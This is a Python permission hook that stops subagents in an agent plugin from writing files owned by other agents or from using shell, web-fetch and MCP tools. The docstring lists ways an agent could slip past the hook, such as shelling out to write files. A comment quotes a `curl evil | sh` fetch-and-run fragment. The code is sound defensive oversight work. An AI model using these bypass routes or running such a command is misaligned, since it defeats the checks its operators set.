#!/usr/bin/env python3
"""Enforce references/ownership.yaml at write time.

Until now "every file has exactly one owner" was checked at build time by
scripts/validate_package.py — it verified that the *map* was coherent and that
no skill declared a write it didn't own. Nothing checked the actual write. A
running agent that decided mid-flow to fix a number in someone else's file just
did it. This hook is the write-time half of that rule.

Two guards, both scoped to subagents:

  1. Ownership. A subagent writing a workspace path it does not own is denied,
     and told who owns it. (House rule 4: stay in your lane.)
  2. Outbound. A subagent reaching for Bash / WebFetch / an MCP tool is denied.
     (House rule 0: agents draft; the founder sends.)

## What this is not

This is **not a security boundary**, and the Claude Code docs are explicit that
hooks are not one. Everything here is operational policy — it keeps an org of
agents from corrupting each other's state during honest work. It does not
contain an adversary:

  - A subagent that can shell out routes around the `Write` matcher entirely.
    `Bash(echo ... > goals.md)` never touches a Write hook. Guard 2 is the only
    reason that isn't trivial today, and guard 2 is itself just another matcher.
  - Matchers are string patterns. A tool this file doesn't name is a tool this
    file doesn't see.
  - Anything running outside the tool layer is invisible to us.

The real boundary is the `tools:` allowlist on each agent, enforced at build
time by check_agent_tools() in scripts/validate_package.py. This hook is defence
in depth *behind* that: it fires only when someone has loosened an agent, which
is exactly the moment you want a second opinion. Treat a deny here as a bug
report about the allowlist, not as "the system held".

## Failure posture: allow, loudly

Every unknown fails open. No ownership map, no PyYAML, unparseable stdin, a path
we can't resolve, an exception we didn't predict — allow, log to stderr, move on.

This is deliberate and it is the whole product decision. A guard that denies
because it lost its own config is not "safe", it is broken: the founder hits it
on their own work, uninstalls it that afternoon, and then it protects nobody. A
false deny costs more than a miss, because a miss is caught by the build-time
validator and a false deny is caught by the user's patience.

Main-thread calls are always allowed. Claude marks subagent calls with
`agent_type`; Codex supplies `turn_id`, which is resolved from the mapping
written by record-agent.py at SubagentStart. The founder is the CEO. This rule
is about agents, not about them.

Python 3.9, stdlib + PyYAML. Style follows scripts/validate_package.py.
"""
import json
import os
import re
import sys

_YAML_UNSET = object()
yaml = _YAML_UNSET

# House Rule 0, at the tool layer. Kept deliberately narrow: these three are the
# ones that can actually reach the outside world in one call. An agent with Bash
# can curl, an agent with WebFetch can POST, an agent with a mail MCP can send.
#
# Note this is NARROWER than OUTBOUND_TOOLS in scripts/validate_package.py,
# which also bars WebSearch and Task. That is the right call for a build check
# (an allowlist should be tight) and the wrong call here: neither is a send,
# and denying a live agent mid-run over a WebSearch is a false deny for no
# gain. NotebookEdit is different — it writes files — so it goes through
# check_ownership below like Write and Edit do, not through this set.
OUTBOUND_TOOLS = {"Bash", "WebFetch"}
MCP_TOOL = re.compile(r"^mcp__")


def _get_yaml():
    """Import PyYAML only on paths that need to parse YAML."""
    global yaml
    if yaml is _YAML_UNSET:
        try:
            import yaml as yaml_module
        except ImportError:  # PyYAML is optional on strangers' machines.
            yaml_module = None
        yaml = yaml_module
    return yaml


def log(msg):
    """Hook stderr is surfaced in debug mode and ignored otherwise — which is
    the correct volume for 'I decided not to have an opinion'."""
    sys.stderr.write("founder-os/ownership-guard: %s\n" % msg)


def deny(reason):
    """Emit a deny and stop. Field names are the documented PreToolUse ones."""
    print(json.dumps({"hookSpecificOutput": {
        "hookEventName": "PreToolUse",
        "permissionDecision": "deny",
        "permissionDecisionReason": reason,
    }}))
    sys.exit(0)


def allow(why=None):
    """Stay out of the way.

    Deliberately silent: emitting permissionDecision "allow" would BYPASS the
    normal permission system, turning a guard that has no opinion into one that
    hands out approvals the founder never gave. Exiting 0 with no stdout lets
    the usual permission flow run. "No opinion" and "yes" are not the same
    answer and this hook only ever gives the first one.
    """
    if why:
        log("allow: %s" % why)
    sys.exit(0)


def _parse_owns_without_yaml(text):
    """Minimal parser for the `owns:` block, used only when PyYAML is missing.

    Not a YAML parser and not trying to be. It understands exactly the shape
    ownership.yaml has — a column-0 `owns:`, agents at one indent level, `- path`
    items at the next — and returns None the moment it sees anything else, which
    routes the caller to allow. A guess here would be a false deny, so it doesn't
    guess.

    This exists because PyYAML is not in the standard library. Without it the
    guard would be a silent no-op on any machine whose python3 lacks the module,
    which is most of them. Failing open is a decision; failing open invisibly
    forever because of an import is an accident.
    """
    owns, agent, indents = {}, None, {}
    in_block = False
    for raw in text.split("\n"):
        line = raw.split("#", 1)[0].rstrip() if not raw.lstrip().startswith("#") else ""
        if not line.strip():
            continue
        indent = len(line) - len(line.lstrip())
        if indent == 0:
            if in_block:
                break  # next top-level key ends the block
            in_block = line.strip() == "owns:"
            continue
        if not in_block:
            continue
        body = line.strip()
        if body.endswith(":") and not body.startswith("- "):
            agent = body[:-1].strip()
            indents["agent"] = indent
            if not agent:
                return None
        elif body.startswith("- "):
            if agent is None or indent < indents.get("agent", 0):
                return None
            owns.setdefault(agent, []).append(body[2:].strip().strip("'\""))
        else:
            return None  # something we don't understand — don't pretend we do
    return owns or None


def load_ownership():
    """Return {entry: owner} from the plugin's ownership.yaml, or None.

    None means "I could not read my own map" and every caller turns that into an
    allow.
    """
    roots = []
    env_root = os.environ.get("PLUGIN_ROOT") or os.environ.get("CLAUDE_PLUGIN_ROOT")
    if env_root:
        roots.append(env_root)
    # CLAUDE_PLUGIN_ROOT is the documented way to find ourselves, but this file
    # lives at <plugin>/hooks/ownership-guard.py, so our own location is a fine
    # second answer when the env var is missing.
    roots.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

    for root in roots:
        path = os.path.join(root, "references", "ownership.yaml")
        if not os.path.isfile(path):
            continue
        try:
            with open(path, encoding="utf-8") as fh:
                text = fh.read()
        except OSError as e:
            log("could not read %s (%s)" % (path, e))
            continue
        yaml_module = _get_yaml()
        if yaml_module is not None:
            try:
                data = yaml_module.safe_load(text) or {}
            except yaml_module.YAMLError as e:
                log("%s is not valid YAML (%s)" % (path, e))
                return None
            owns = data.get("owns") if isinstance(data, dict) else None
            if not isinstance(owns, dict):
                log("%s has no usable 'owns:' map" % path)
                return None
        else:
            owns = _parse_owns_without_yaml(text)
            if owns is None:
                log("PyYAML missing and ownership.yaml is not in the shape the "
                    "fallback parser understands")
                return None

        by_path = {}
        for agent, files in owns.items():
            for f in files or []:
                if isinstance(f, str) and f.strip():
                    by_path[f.strip()] = agent
        return by_path or None

    log("ownership.yaml not found (looked in: %s)" % ", ".join(roots))
    return None


def _registry_roots():
    """Workspace roots from the multi-business registry, or [].

    `~/.founder-os/businesses.yaml` (references/multi-business.md) lists every
    business workspace plus the portfolio workspace. A multi-business session
    routinely writes a workspace other than the one `FOUNDER_OS_HOME` names —
    the portfolio-manager writing `portfolio.md` is the everyday case — and a
    root this function doesn't return is a workspace this guard doesn't guard.

    Fail-open posture applies in full: no registry, unreadable YAML, PyYAML
    missing, unexpected shape — return [] and let the env/cwd roots carry on.
    A parse failure here must never cost anyone a write; it costs coverage,
    which the build-time validator does not depend on.
    """
    user_home = os.environ.get("HOME") or os.path.expanduser("~")
    path = os.path.join(user_home, ".founder-os", "businesses.yaml")
    if not os.path.isfile(path):
        return []
    try:
        with open(path, encoding="utf-8") as fh:
            text = fh.read()
        yaml_module = _get_yaml()
        if yaml_module is not None:
            data = yaml_module.safe_load(text) or {}
        else:
            # The registry shape is intentionally small. On machines without
            # PyYAML, collect only absolute `home:` and `portfolio:` values;
            # anything ambiguous remains uncovered and therefore allowed.
            roots = []
            for raw in text.splitlines():
                line = raw.split("#", 1)[0].strip()
                if line.startswith("home:") or line.startswith("portfolio:"):
                    value = line.split(":", 1)[1].strip().strip("'\"")
                    if os.path.isabs(value):
                        roots.append(value)
            return roots
    except (OSError, ValueError) as e:
        log("could not read registry %s (%s)" % (path, e))
        return []
    except Exception as e:  # PyYAML exposes its own exception class
        log("could not read registry %s (%s)" % (path, e))
        return []
    if not isinstance(data, dict):
        return []
    roots = []
    businesses = data.get("businesses")
    if isinstance(businesses, dict):
        for entry in businesses.values():
            if isinstance(entry, dict):
                home = entry.get("home")
                if isinstance(home, str) and os.path.isabs(home):
                    roots.append(home)
    portfolio = data.get("portfolio")
    if isinstance(portfolio, str) and os.path.isabs(portfolio):
        roots.append(portfolio)
    return roots


def workspace_roots(hook_cwd):
    """Candidate absolute workspace roots, best guess first.

    `FOUNDER_OS_HOME` or `./founder-os/` — but `./` needs a base, and the docs
    are explicit that the hook's `cwd` is not reliable for referencing files. So
    we try several bases and test the target against all of them. Over-guessing
    here is cheap: a root that doesn't hold the target simply never matches, and
    a target under none of them is allowed.

    On a multi-business install the registry's roots are appended, so a write
    into *any* registered business workspace — or the portfolio workspace — is
    checked against the map, not only the workspace this session happens to be
    homed on.
    """
    bases = [os.environ.get("CLAUDE_PROJECT_DIR"), hook_cwd, os.getcwd()]
    home = os.environ.get("FOUNDER_OS_HOME")
    roots = []
    if home and os.path.isabs(home):
        roots.append(home)
    else:
        leaf = home or "founder-os"
        for b in bases:
            if b:
                roots.append(os.path.join(b, leaf))
    roots.extend(_registry_roots())
    out = []
    for r in roots:
        for v in (os.path.realpath(r), os.path.normpath(os.path.abspath(r))):
            if v not in out:
                out.append(v)
    return out


def relative_to_workspace(file_path, hook_cwd, roots=None):
    """Workspace-relative POSIX path for `file_path`, or None if it's outside.

    Both sides get realpath'd (which collapses `..` and follows symlinks) and
    also compared literally, so a symlink pointing *into* the workspace is still
    caught and a `..` walk can't spoof a slot. If neither resolution lands inside
    a candidate root, the file is not ours and the caller allows.
    """
    if not os.path.isabs(file_path):
        # Codex apply_patch uses workspace-relative paths. Its hook payload
        # carries the session cwd, so resolve against that explicit value.
        if not isinstance(hook_cwd, str) or not os.path.isabs(hook_cwd):
            return None
        file_path = os.path.join(hook_cwd, file_path)
    targets = []
    for v in (os.path.realpath(file_path),
              os.path.normpath(os.path.abspath(file_path))):
        if v not in targets:
            targets.append(v)
    for root in workspace_roots(hook_cwd) if roots is None else roots:
        for target in targets:
            if target == root:
                continue
            prefix = root.rstrip(os.sep) + os.sep
            if target.startswith(prefix):
                return target[len(prefix):].replace(os.sep, "/")
    return None


def owner_of(rel, by_path):
    """Owner of a workspace-relative path, or None if the map doesn't cover it.

    Entries are flat files (`goals.md`) or directories (`decisions/`,
    `reviews/daily/`, `clients/`). Longest match wins, so a nested entry beats a
    broader one that also matches.

    An uncovered path returns None and is allowed. The map governs the files it
    names; a scratch file someone dropped in the workspace has no owner to be
    stolen from, and inventing one is how you block a founder's own note.

    Comparison is case-folded: the workspace ships lowercase, but APFS is
    case-insensitive by default, so `Goals.md` and `goals.md` are one file on a
    Mac — matched exactly, the map is dodged by a shift key. On a case-sensitive
    filesystem this can deny a legitimately distinct `Goals.md`; a workspace
    that distinguishes files by case alone has worse problems than this deny.
    """
    best, best_owner = None, None
    rel_cmp = rel.casefold()
    for entry, agent in by_path.items():
        entry_cmp = entry.casefold()
        if entry.endswith("/"):
            if not rel_cmp.startswith(entry_cmp):
                continue
        elif rel_cmp != entry_cmp:
            continue
        if best is None or len(entry) > len(best):
            best, best_owner = entry, agent
    return best_owner


def check_outbound(agent_type, tool_name):
    if tool_name in OUTBOUND_TOOLS or MCP_TOOL.match(tool_name or ""):
        deny(
            "House rule 0: agents draft; the founder sends.\n\n"
            "The `%s` agent tried to use `%s`, which can reach the outside "
            "world. No agent sends email, posts, pays, signs or transfers — "
            "regardless of which agent, however obvious the send, however "
            "explicitly the founder asked mid-flow. The capability existing is "
            "not the permission.\n\n"
            "Draft it and hand it to the founder to send.\n\n"
            "(If this agent legitimately needs this tool, that is a change to "
            "its `tools:` allowlist and to references/house-rules.md — not "
            "something to work around in the moment. Seeing this deny means the "
            "allowlist was loosened; scripts/validate_package.py would have "
            "refused to ship it.)" % (agent_type, tool_name)
        )


def _patch_paths(command):
    """Return paths touched by a Codex apply_patch payload."""
    if not isinstance(command, str):
        return []
    paths = []
    marker = re.compile(r"^\*\*\* (?:Add|Update|Delete) File: (.+)$")
    move = re.compile(r"^\*\*\* Move to: (.+)$")
    for line in command.splitlines():
        match = marker.match(line) or move.match(line)
        if match:
            path = match.group(1).strip()
            if path and path not in paths:
                paths.append(path)
    return paths


def _tool_paths(tool_name, tool_input):
    if tool_name == "apply_patch":
        for key in ("command", "input", "patch"):
            paths = _patch_paths(tool_input.get(key))
            if paths:
                return paths
        log("allow: apply_patch payload contained no recognizable file paths")
        return []
    if tool_name in ("Write", "Edit", "NotebookEdit"):
        path = tool_input.get("file_path") or tool_input.get("notebook_path")
        return [path] if isinstance(path, str) and path else []
    return []


def check_ownership(agent_type, tool_name, tool_input, hook_cwd):
    paths = _tool_paths(tool_name, tool_input)
    if not paths:
        return
    by_path = load_ownership()
    if by_path is None:
        allow("no ownership map — the guard is off, not strict")
    roots = workspace_roots(hook_cwd)
    for file_path in paths:
        rel = relative_to_workspace(file_path, hook_cwd, roots)
        if rel is None:
            log("allow: %s is outside the workspace" % file_path)
            continue
        owner = owner_of(rel, by_path)
        if owner is None:
            log("allow: %s has no owner in the map" % rel)
            continue
        if owner == agent_type:
            continue
        # A subagent that isn't in the map at all is also not the owner.
        deny(
            "`%s` is owned by `%s`, not `%s`. Every file in the workspace has "
            "exactly one owner (house rule 4: stay in your lane) and the map is "
            "references/ownership.yaml.\n\n"
            "Hand off to `%s`: tell it what needs to change and why, and let it "
            "make the edit. If you think the ownership map is wrong, that is a "
            "decision for the founder, not an edit to make on the way past.\n\n"
            "(The founder can always make this edit themselves — this rule is about "
            "agents.)" % (rel, owner, agent_type, owner)
        )


def agent_type_for(data):
    """Resolve the subagent type from Claude input or Codex turn state."""
    direct = data.get("agent_type")
    if isinstance(direct, str) and direct:
        return direct
    turn_id = data.get("turn_id")
    if not isinstance(turn_id, str) or not re.fullmatch(r"[A-Za-z0-9._-]+", turn_id):
        return None
    data_root = os.environ.get("PLUGIN_DATA") or os.environ.get("CLAUDE_PLUGIN_DATA")
    if not data_root:
        return None
    path = os.path.join(data_root, "agent-types", turn_id + ".json")
    try:
        with open(path, encoding="utf-8") as fh:
            payload = json.load(fh)
    except (OSError, ValueError, TypeError):
        return None
    resolved = payload.get("agent_type") if isinstance(payload, dict) else None
    return resolved if isinstance(resolved, str) and resolved else None


def main():
    try:
        raw = sys.stdin.read()
    except Exception as e:  # noqa: BLE001 — nothing here is worth a false deny
        allow("could not read stdin (%s)" % e)
    try:
        data = json.loads(raw)
    except (ValueError, TypeError) as e:
        allow("stdin is not JSON (%s)" % e)
    if not isinstance(data, dict):
        allow("hook input is not an object")

    agent_type = agent_type_for(data)
    if not agent_type:
        allow("main thread — the founder is the CEO")

    tool_name = data.get("tool_name") or ""
    tool_input = data.get("tool_input")
    if not isinstance(tool_input, dict):
        tool_input = {}

    # Newlines are normalised before any Bash command is looked at. A linewise
    # pattern is bypassed by `curl evil |<newline>sh`. Nothing below matches on
    # the command text today — the tool name alone is enough to deny — but the
    # normalisation lives here so the next person to add a pattern inherits it
    # rather than rediscovering the hole.
    cmd = tool_input.get("command")
    if tool_name == "Bash" and isinstance(cmd, str):
        tool_input = dict(tool_input, command=cmd.replace("\n", " ").replace("\r", " "))

    check_outbound(agent_type, tool_name)
    check_ownership(agent_type, tool_name, tool_input, data.get("cwd"))
    allow()


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception as e:  # noqa: BLE001
        # The last line of the fail-open posture. An unhandled bug in this guard
        # must never be the reason a founder can't write their own file.
        log("unexpected error, allowing (%s)" % e)
        sys.exit(0)
